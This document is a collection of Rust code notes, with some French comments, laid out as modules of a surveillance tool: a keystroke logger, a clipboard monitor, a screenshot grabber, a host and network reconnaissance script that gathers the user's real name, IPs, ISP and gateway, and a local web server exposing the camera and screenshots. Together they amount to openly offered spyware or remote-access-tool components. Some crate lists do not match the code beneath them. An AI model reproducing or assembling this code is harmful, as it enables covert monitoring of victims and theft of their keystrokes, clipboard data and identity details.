# Key/mouse Logger

# crate

actix-web = "4"

# code

```rust
fn main() {
    use rdev::{listen, Event};

    // <== This will block.
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }

    fn callback(event: Event) {
        // <== This is the callback function
        println!("My callback {:?}", event);
        match event.name {
            // <== This is the event name
            Some(string) => println!("User wrote {:?}", string), // <== This is the event value
            None => (),
        }
    }
}
```

# Camera

# crate

rdev = "0.5.3"
hyper = "0.14"
winit = "0.25"
image = "0.23"

# code

```rust
use actix_web::{web, App, HttpServer, Result};
use std::io;

async fn index() -> Result<actix_web::HttpResponse> {
    Ok(actix_web::HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/camera.html")))
}

#[actix_web::main]
async fn main() -> io::Result<()> {
    HttpServer::new(|| {
        App::new()
            .route("/", web::get().to(index))
            .service(actix_web::web::resource("/").to(index))
            .service(actix_web::web::resource("/{_:.*}").to(index))
    })
    .bind("127.0.0.1:8080")?
    .run()
    .await
}

```

# INFORMATIONS LIST

# crate

sysinfo = "0.30.12"
whoami = "1.2"
reqwest = { version = "0.12.4", features = ["json"] }
serde = { version = "1.0", features = ["derive"] }
local-ip-address = "0.6.1"
tokio = { version = "1", features = ["full"] }

# code

```rust
use local_ip_address::local_ip;
use reqwest;
use serde::Deserialize;
use std::collections::HashMap;
use std::process::Command;
use sysinfo::System;
use whoami;

#[allow(deprecated)]
#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Initialisation du système pour récupérer les informations
    let mut system = System::new_all();
    system.refresh_all();

    // Récupération des informations sur le CPU
    let cpu_info = system.global_cpu_info();
    let cpu_name = cpu_info.name();
    let cpu_usage = cpu_info.cpu_usage();

    // Récupération des informations sur la RAM
    let total_memory = system.total_memory();
    let used_memory = system.used_memory();

    // Récupération du nom de l'ordinateur
    let hostname = whoami::hostname();

    // Récupération du nom de l'utilisateur
    let username = whoami::username();

    // Récupération du vrai nom de l'utilisateur
    let realname = whoami::realname();

    // Récupération de la version de l'OS
    let os = whoami::distro();

    // Récupération du nom du périphérique
    let device_name = whoami::devicename();

    // Récupération de l'environnement de bureau
    let desktop_env = whoami::desktop_env();

    // Récupération de la plateforme
    let platform = whoami::platform();

    // Autres informations utiles
    let architecture = whoami::arch();

    // Récupération de l'adresse IP privée
    let private_ip = local_ip().unwrap();

    // Récupération de l'adresse IP publique, du fournisseur internet et de la région
    let public_ip_info = get_public_ip_info().await.unwrap_or(IpInfo {
        ip: "Unavailable".to_string(),
        region: "Unavailable".to_string(),
        org: "Unavailable".to_string(),
    });

    // Récupération de la passerelle par défaut
    let default_gateway = get_default_gateway().unwrap_or_else(|_| "Unknown".to_string());

    // Compilation des informations dans un HashMap
    let mut system_info = HashMap::new();
    system_info.insert("CPU Name", cpu_name.to_string());
    system_info.insert("CPU Usage", format!("{:.2}%", cpu_usage));
    system_info.insert("Total Memory", format!("{} MB", total_memory / 1024));
    system_info.insert("Used Memory", format!("{} MB", used_memory / 1024));
    system_info.insert("Hostname", hostname);
    system_info.insert("Username", username);
    system_info.insert("Real Name", realname);
    system_info.insert("OS", os);
    system_info.insert("Device Name", device_name);
    system_info.insert("Desktop Environment", format!("{:?}", desktop_env));
    system_info.insert("Platform", format!("{:?}", platform));
    system_info.insert("Architecture", format!("{:?}", architecture));
    system_info.insert("Private IP", private_ip.to_string());
    system_info.insert("Public IP", public_ip_info.ip);
    system_info.insert("Region", public_ip_info.region);
    system_info.insert("ISP", public_ip_info.org);
    system_info.insert("Default Gateway", default_gateway);

    // Affichage des informations
    for (key, value) in &system_info {
        println!("{}: {}", key, value);
    }

    Ok(())
}

#[derive(Deserialize)]
struct IpInfo {
    ip: String,
    region: String,
    org: String,
}

async fn get_public_ip_info() -> Result<IpInfo, reqwest::Error> {
    let response = reqwest::get("https://ipinfo.io/json").await?;
    let ip_info: IpInfo = response.json().await?;
    Ok(ip_info)
}

fn get_default_gateway() -> Result<String, std::io::Error> {
    let output = if cfg!(target_os = "windows") {
        Command::new("powershell")
            .arg("-NoProfile")
            .arg("-Command")
            .arg("Get-NetRoute -AddressFamily IPv4 | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' } | Select-Object -ExpandProperty NextHop")
            .output()?
    } else {
        Command::new("sh")
            .arg("-c")
            .arg("ip route | grep default | awk '{print $3}'")
            .output()?
    };

    let gateway = String::from_utf8_lossy(&output.stdout).trim().to_string();
    Ok(gateway)
}
```

# ClipboardSend

# crate

arboard = "3.4.0"

# code

```rust
use arboard::Clipboard;

fn main() {
    let mut clipboard = Clipboard::new().unwrap();

    // Get the current clipboard content
    match clipboard.get_text() {
        Ok(text) => println!("Clipboard text was: {}", text),
        Err(e) => println!("Failed to get clipboard content: {}", e),
    }

    // Set new clipboard content
    let new_text = "Hello, world!";
    clipboard.set_text(new_text).unwrap();
    println!("Clipboard text is now: \"{}\"", new_text);
}
```

# Clipboard listen

# crate

arboard = "3.4.0"
tokio = { version = "1", features = ["full"] }

# code

```rust
use arboard::Clipboard;
use std::time::Duration;
use tokio::time::sleep;

#[tokio::main]
async fn main() {
    let mut clipboard = Clipboard::new().unwrap();
    let mut previous_content = String::new();

    loop {
        match clipboard.get_text() {
            Ok(current_content) => {
                if current_content != previous_content {
                    println!("Clipboard content changed: {}", current_content);
                    previous_content = current_content;
                }
            }
            Err(e) => {
                println!("Failed to get clipboard content: {}", e);
            }
        }
        sleep(Duration::from_secs(1)).await;
    }
}
```

# Screenshot

# crate

screenshot-rs = "0.1.5"

# code

```rust
use std::process::Command;

fn main() {
    let output_file = "screenshot.png";

    // List of screenshot tools to try for Linux
    let linux_tools = [
        ("scrot", format!("scrot {}", output_file)),
        ("spectacle", format!("spectacle -b -o {}", output_file)),
        ("import", format!("import -window root {}", output_file)), // part of ImageMagick
        ("maim", format!("maim {}", output_file)),
        ("xwd", format!("xwd -root | convert xwd:- {}", output_file)), // requires ImageMagick
    ];

    // List of screenshot tools to try for Windows
    let windows_tools = [
        ("nircmd", format!("nircmd savescreenshot {}", output_file)),
        // Additional Windows tools can be added here
    ];

    let mut screenshot_taken = false;

    // Determine the appropriate command based on the environment
    let tools = if cfg!(target_os = "linux") {
        linux_tools.iter()
    } else if cfg!(target_os = "windows") {
        windows_tools.iter()
    } else {
        panic!("Unsupported OS");
    };

    for (tool, cmd) in tools {
        if Command::new(tool).output().is_ok() {
            println!("Using tool: {}", tool);
            let output = Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .output()
                .expect("Failed to execute screenshot command");

            if output.status.success() {
                println!("Screenshot saved to {}", output_file);
                screenshot_taken = true;
                break;
            } else {
                eprintln!(
                    "Failed to take screenshot with {}: {}",
                    tool,
                    String::from_utf8_lossy(&output.stderr)
                );
            }
        }
    }

    if !screenshot_taken {
        eprintln!("No suitable screenshot tool found or all tools failed");
    }
}

```

# camera and screenshot index on 8080

# crate

screenshot-rs = "0.1.5"
rdev = "0.5.3"
hyper = "1.3.1"
winit = "0.30.0"
image = "0.25.1"
actix-files = "0.6"
actix-web = "4"

# code

```rust
use actix_files::NamedFile;
use actix_web::{web, App, HttpResponse, HttpServer, Result};
use std::io;
use std::path::PathBuf;
use std::process::Command;
use std::sync::Mutex;

struct AppState {
    screenshot_file: Mutex<String>,
}

async fn index() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/index.html")))
}

async fn screenshot() -> Result<HttpResponse> {
    // Take the screenshot and save it to a file
    let output_file = "screenshot.png";
    let linux_tools = [
        ("scrot", format!("scrot {}", output_file)),
        ("spectacle", format!("spectacle -b -o {}", output_file)),
        ("import", format!("import -window root {}", output_file)), // part of ImageMagick
        ("maim", format!("maim {}", output_file)),
        ("xwd", format!("xwd -root | convert xwd:- {}", output_file)), // requires ImageMagick
    ];

    let windows_tools = [("nircmd", format!("nircmd savescreenshot {}", output_file))];

    let tools = if cfg!(target_os = "linux") {
        linux_tools.iter()
    } else if cfg!(target_os = "windows") {
        windows_tools.iter()
    } else {
        panic!("Unsupported OS");
    };

    let mut screenshot_taken = false;

    for (tool, cmd) in tools {
        if Command::new(tool).output().is_ok() {
            let output = Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .output()
                .expect("Failed to execute screenshot command");

            if output.status.success() {
                screenshot_taken = true;
                break;
            }
        }
    }

    if !screenshot_taken {
        return Ok(HttpResponse::InternalServerError().body("Failed to take screenshot"));
    }

    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/screenshot.html")))
}

async fn get_screenshot() -> Result<NamedFile> {
    let path: PathBuf = "screenshot.png".parse().unwrap();
    Ok(NamedFile::open(path)?)
}

async fn camera() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/camera.html")))
}

#[actix_web::main]
async fn main() -> io::Result<()> {
    let app_state = web::Data::new(AppState {
        screenshot_file: Mutex::new(String::from("screenshot.png")),
    });

    HttpServer::new(move || {
        App::new()
            .app_data(app_state.clone())
            .route("/", web::get().to(index))
            .route("/screenshot", web::get().to(screenshot))
            .route("/get_screenshot", web::get().to(get_screenshot))
            .route("/camera", web::get().to(camera))
    })
    .bind("127.0.0.1:8080")?
    .run()
    .await
}

```

# code index.html

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Camera Stream</title>
  </head>
  <body>
    <h1>Camera Stream</h1>
    <p>Go to <a href="/camera">/camera</a> to see the camera stream.</p>
    <p>Go to <a href="/screenshot">/screenshot</a> to take a screenshot.</p>
  </body>
</html>
```

# code camera.html

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Camera Stream</title>
    <style>
      body,
      html {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        overflow: hidden;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      video {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
    </style>
  </head>
  <body>
    <video id="video" autoplay></video>
    <script>
      (function () {
        const video = document.getElementById("video");
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices
            .getUserMedia({ video: true })
            .then(function (stream) {
              video.srcObject = stream;
              video.play();
            })
            .catch(function (err) {
              console.error("Error accessing camera: ", err);
            });
        } else {
          alert("getUserMedia not supported in this browser.");
        }
      })();
    </script>
  </body>
</html>
```

# code screenshot.html

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Screenshot</title>
  </head>
  <body>
    <h1>Screenshot</h1>
    <img src="/get_screenshot" alt="Screenshot" />
    <p><a href="/">Back to home</a></p>
  </body>
</html>
```
